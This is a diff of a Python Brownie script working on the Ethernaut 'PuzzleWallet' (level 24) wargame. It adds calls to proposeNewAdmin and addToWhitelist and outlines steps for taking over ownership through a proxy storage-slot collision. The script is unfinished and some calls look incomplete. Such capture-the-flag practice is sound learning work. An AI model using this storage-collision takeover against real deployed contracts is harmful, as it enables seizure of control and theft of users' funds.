@@ -3,7 +3,7 @@ from scripts.helpful_scripts import get_account
 from brownie import web3, network, interface, convert, Attack24
 from eth_utils import keccak
 
-ETHERNAUT_INSTANCE = "0x05fBa7fcfA03f0b632Dc393e1fb8AE03943A4860"
+ETHERNAUT_INSTANCE = "0x5e6a96aC38aFeDA2E16838FfA5E98791b331621E"
 
 GAS_LIMIT = 12000000
 
@@ -27,12 +27,14 @@ def print_status():
     slot_3 = web3.eth.getStorageAt(ETHERNAUT_INSTANCE, 3)       # slot 3 
     slot_3_unint = int.from_bytes(slot_3, "big", signed="False")
     print(f"storage slot 3:  {slot_3_unint}")
+
+    # need 2 whitelisted address... make that work 'Address0 WL'
+    
     print("----------------- END ------------------\n")
    
     
-
 """
-        0x725595ba16e76ed1f6cc1e1b65a88365cc494824  <- admin address at start
+    0x725595ba16e76ed1f6cc1e1b65a88365cc494824  <- admin address at start
 
 
     Function to print the following status message:
@@ -57,6 +59,11 @@ def main():
     # attack = Attack24.deploy({"from": player})
     # proxy_balance()
     print_status()
+    
+    interface.proposeNewAdmin(player) # <-- use the collision
+    interface.addToWhitelist(player)
+    
+    print_status()
 
 
 """
@@ -67,7 +74,7 @@ def main():
     1. set pendingAdmin by calling --> proposeNewAdmin(player)
 
     2. now: owner == address(player)
-
+    
     3. call addToWhiteList(player)
 
     4. player is now 'white listed'
